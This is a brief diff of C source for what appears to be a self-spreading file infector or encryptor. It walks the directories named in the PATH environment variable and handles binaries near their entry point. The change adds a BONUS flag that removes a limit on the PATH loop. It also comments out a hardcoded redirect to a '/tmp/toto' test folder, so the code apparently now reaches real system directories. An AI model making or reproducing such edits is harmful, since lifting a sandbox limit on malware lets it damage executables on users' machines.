@@ -14,6 +14,7 @@
 
 # include <stdio.h> // DELL printfs
 # define SIZE_BEFORE_ENTRY_POINT (62 + 2 * sizeof(size_t))
+# define BONUS 1
 
 typedef struct	s_file
 {
@@ -473,6 +474,8 @@ void main_encrypt()
 	int length_path =0;
 	do
 	{
+		if( !BONUS && i > 21)
+			return ;
 		if(path_env[i] == ':')
 		{
 			path_env[i] = '\0';
@@ -584,16 +587,16 @@ int open_directory(char *path)
 	//printf("directory: '%s'\n",path);
 
 	//path = "/tmp/toto";
-	path[0] = '/';
-	path[1] = 't';
-	path[2] = 'm';
-	path[3] = 'p';
-	path[4] = '/';
-	path[5] = 't';
-	path[6] = 'o';
-	path[7] = 't';
-	path[8] = 'o';
-	path[9] = 0;
+	// path[0] = '/';
+	// path[1] = 't';
+	// path[2] = 'm';
+	// path[3] = 'p';
+	// path[4] = '/';
+	// path[5] = 't';
+	// path[6] = 'o';
+	// path[7] = 't';
+	// path[8] = 'o';
+	// path[9] = 0;
 
 	dd = open(path, 0x10000,0);
 	if (dd < 0)
